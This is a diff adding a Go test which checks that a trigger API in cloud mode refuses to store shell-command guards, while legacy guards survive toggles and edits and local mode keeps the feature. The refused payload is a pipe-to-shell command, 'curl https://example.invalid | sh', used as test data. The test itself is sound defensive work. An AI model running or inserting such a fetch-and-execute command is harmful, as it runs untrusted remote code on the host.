@@ -328,3 +328,80 @@ func TestEmitTrigger_RejectsOversizedVars(t *testing.T) {
 		t.Fatalf("oversized vars status = %d; want 400", rec.Code)
 	}
 }
+
+// A cloud deployment refuses a trigger guard — the same shell command a
+// schedule guard is, through a route a cloud server mounts. The refusal is
+// about a guard the request SETS: a request that says nothing about one
+// leaves the stored guard alone, so an operator can still disable or edit a
+// trigger stored before the refusal existed.
+func TestTriggers_CloudRefusesAGuardItIsAskedToStore(t *testing.T) {
+	srv := newTriggerTestServer(t)
+	srv.cfg.Mode = "cloud"
+	base := `"bot_id":"feature-dev","invocation":"board","mode":"board","match":{"sources":["board"]}`
+
+	rec := httptest.NewRecorder()
+	srv.handleCreateTrigger(rec, httptest.NewRequest(http.MethodPost, "/api/v1/triggers",
+		bytes.NewBufferString(`{`+base+`,"guard":"curl https://example.invalid | sh"}`)))
+	if rec.Code != http.StatusUnprocessableEntity {
+		t.Fatalf("create with a guard = %d, want 422; body=%s", rec.Code, rec.Body.String())
+	}
+
+	// A row stored before the refusal existed.
+	stored := trigger.Subscription{ID: "sub-legacy", BotID: "feature-dev", Invocation: "board", Mode: "board", Enabled: true, Guard: "true"}
+	if err := srv.cfg.TriggerStore.Create(context.Background(), stored); err != nil {
+		t.Fatal(err)
+	}
+	// The payload the studio sends: it is built from the stored subscription,
+	// so it carries the guard back unchanged. A refusal on PRESENCE would
+	// refuse every toggle of exactly the rows this exemption is for.
+	upd := httptest.NewRequest(http.MethodPut, "/api/v1/triggers/sub-legacy",
+		bytes.NewBufferString(`{`+base+`,"enabled":false,"guard":"true"}`))
+	upd.SetPathValue("id", "sub-legacy")
+	urec := httptest.NewRecorder()
+	srv.handleUpdateTrigger(urec, upd)
+	if urec.Code != http.StatusOK {
+		t.Fatalf("disabling a trigger that holds a guard = %d, want 200; body=%s", urec.Code, urec.Body.String())
+	}
+	got, err := srv.cfg.TriggerStore.Get(context.Background(), "sub-legacy")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got.Enabled {
+		t.Error("the trigger was not disabled")
+	}
+	if got.Guard != "true" {
+		t.Errorf("an edit that said nothing about the guard changed it to %q", got.Guard)
+	}
+
+	// An edit that says nothing about the guard keeps it too.
+	silent := httptest.NewRequest(http.MethodPut, "/api/v1/triggers/sub-legacy",
+		bytes.NewBufferString(`{`+base+`,"enabled":true}`))
+	silent.SetPathValue("id", "sub-legacy")
+	qrec := httptest.NewRecorder()
+	srv.handleUpdateTrigger(qrec, silent)
+	if qrec.Code != http.StatusOK {
+		t.Fatalf("an edit that omits the guard = %d, want 200; body=%s", qrec.Code, qrec.Body.String())
+	}
+	if got, _ := srv.cfg.TriggerStore.Get(context.Background(), "sub-legacy"); got.Guard != "true" {
+		t.Errorf("an edit that omitted the guard changed it to %q", got.Guard)
+	}
+
+	// CHANGING one, on the other hand, is refused.
+	set := httptest.NewRequest(http.MethodPut, "/api/v1/triggers/sub-legacy",
+		bytes.NewBufferString(`{`+base+`,"guard":"curl https://example.invalid | sh"}`))
+	set.SetPathValue("id", "sub-legacy")
+	srec := httptest.NewRecorder()
+	srv.handleUpdateTrigger(srec, set)
+	if srec.Code != http.StatusUnprocessableEntity {
+		t.Fatalf("update that SETS a guard = %d, want 422", srec.Code)
+	}
+
+	// Local mode keeps the feature: the server runs it where the operator is.
+	srv.cfg.Mode = ""
+	lrec := httptest.NewRecorder()
+	srv.handleCreateTrigger(lrec, httptest.NewRequest(http.MethodPost, "/api/v1/triggers",
+		bytes.NewBufferString(`{`+base+`,"guard":"true"}`)))
+	if lrec.Code != http.StatusCreated {
+		t.Fatalf("local create with a guard = %d, want 201; body=%s", lrec.Code, lrec.Body.String())
+	}
+}
